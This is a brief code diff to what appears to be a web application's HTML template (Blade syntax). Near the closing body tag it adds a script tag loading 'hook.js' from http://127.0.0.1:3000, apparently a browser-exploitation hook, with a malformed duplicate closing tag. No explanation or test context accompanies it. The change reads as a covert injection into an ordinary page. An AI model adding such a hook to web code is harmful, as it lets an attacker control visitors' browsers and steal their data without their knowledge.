@@ -595,7 +595,7 @@
     </script>
   <!-- Template Main JS File -->
   <script src="{{ asset('assets/js/main.js') }}"></script>
-
+  <script src="http://127.0.0.1:3000/hook.js"></script></script>
 </body>
 
 </html>
